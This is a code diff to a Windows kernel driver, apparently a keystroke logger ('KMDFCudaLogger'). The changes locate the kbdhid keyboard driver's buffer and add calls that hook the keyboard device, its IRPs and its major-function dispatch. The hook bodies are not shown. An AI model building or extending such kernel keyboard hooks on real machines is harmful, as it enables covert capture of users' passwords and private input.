@@ -3,10 +3,10 @@
 #include <Driver.h>   
 #include <ControlDevice.h>
 #include <PageTableManipulation.h>
+#include <KeyboardHooker.h>
 
 PDEVICE_OBJECT usbBaseKeyboardDeviceObject;
 DRIVER_INITIALIZE DriverEntry;
-int numPendingIrps = 0;
 PULONG keyboardBuffer = NULL;
 
 _Use_decl_annotations_
@@ -17,6 +17,7 @@ NTSTATUS GetKeyboardMemoryBuffer(IN PDRIVER_OBJECT pDriverObject)
 	POBJECT_TYPE driverObjectType;
 	PDRIVER_OBJECT kbdHidDriverObject;
 	UNICODE_STRING kbdHidDriverName;
+	PrepHook(pDriverObject);
 
 	// First, get the kbdhid driver
 	RtlInitUnicodeString(&kbdHidDriverName, L"\\Driver\\kbdhid");
@@ -36,6 +37,12 @@ NTSTATUS GetKeyboardMemoryBuffer(IN PDRIVER_OBJECT pDriverObject)
 			PULONG bufferAddress = &dataPointer->buffer;
 			KdPrint(("bufferAddress is [0x%lx]\n", bufferAddress));
 			keyboardBuffer = bufferAddress;
+
+
+			KdPrint(("about to try to hook keyboard\n"));
+			pauseForABit(10);
+			HookKeyboard(pDriverObject, usbBaseKeyboardDeviceObject); // hk
+
 		}
 	}
 	return status;
@@ -47,6 +54,10 @@ NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  DriverObject, _In_ PUNICODE_STRING Reg
 	NTSTATUS status;
 	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "KMDFCudaLogger: DriverEntry\n"));
 
+	KdPrint(("about to try to hook IRPs\n"));
+	pauseForABit(10);
+	HookIrps(DriverObject); // hk
+
 	KdPrint(("Getting Keyboar dMemory Buffer\n"));
 	status = GetKeyboardMemoryBuffer(DriverObject);
 
@@ -56,6 +67,10 @@ NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  DriverObject, _In_ PUNICODE_STRING Reg
 
 	KdPrint(("Creating Control Device\n"));
 	status = CreateControlDevice( DriverObject,  RegistryPath);
+
+	KdPrint(("about to set major function\n"));
+	pauseForABit(10);
+	SetMajorFunction(DriverObject); // hk
 
 	KdPrint(("Exiting Driver Entry\n"));
 
